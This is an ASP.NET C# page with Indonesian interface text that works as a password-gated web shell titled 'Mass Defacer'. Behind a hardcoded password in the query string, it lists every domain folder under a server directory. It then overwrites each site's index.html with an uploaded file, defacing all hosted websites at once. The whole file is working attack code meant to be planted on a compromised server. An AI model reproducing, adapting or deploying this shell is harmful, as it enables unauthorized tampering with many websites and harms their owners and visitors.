<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
void Page_Load() {
    string pass = Request["pass"];
    if (pass != "AdenX2025") {
        Response.Write("Login dulu bro! ?pass=AdenX2025");
        return;
    }
    
    string action = Request["action"];
    
    if (action == "upload" && Request.Files.Count > 0) {
        UploadFile();
    }
    else if (action == "list") {
        ListFiles();
    }
    else {
        ShowMenu();
    }
}

void ShowMenu() {
    Response.Write("<h2>Mass Defacer</h2>");
    Response.Write("<ul>");
    Response.Write("<li><a href='?pass=AdenX2025&action=list'>List Semua Domain</a></li>");
    Response.Write("<li><form method='post' enctype='multipart/form-data'>");
    Response.Write("<input type='hidden' name='action' value='upload'>");
    Response.Write("File: <input type='file' name='f' required>");
    Response.Write("<input type='submit' value='Upload Ke Semua Domain'>");
    Response.Write("</form></li>");
    Response.Write("</ul>");
}

void ListFiles() {
    string dir = @"E:\New_Files\";
    if (!Directory.Exists(dir)) {
        Response.Write("Folder gak ada!");
        return;
    }
    
    string[] folders = Directory.GetDirectories(dir);
    Response.Write("<h3>Total: " + folders.Length + " domain</h3>");
    Response.Write("<pre>");
    foreach (string f in folders) {
        Response.Write(Path.GetFileName(f) + "\n");
    }
    Response.Write("</pre>");
}

void UploadFile() {
    HttpPostedFile file = Request.Files[0];
    byte[] data = new byte[file.ContentLength];
    file.InputStream.Read(data, 0, file.ContentLength);
    
    string dir = @"E:\New_Files\";
    string[] folders = Directory.GetDirectories(dir);
    
    int ok = 0;
    int fail = 0;
    
    foreach (string folder in folders) {
        try {
            string path = folder + "\\index.html";
            File.WriteAllBytes(path, data);
            ok++;
        }
        catch {
            fail++;
        }
    }
    
    Response.Write("Sukses: " + ok + ", Gagal: " + fail);
}
</script>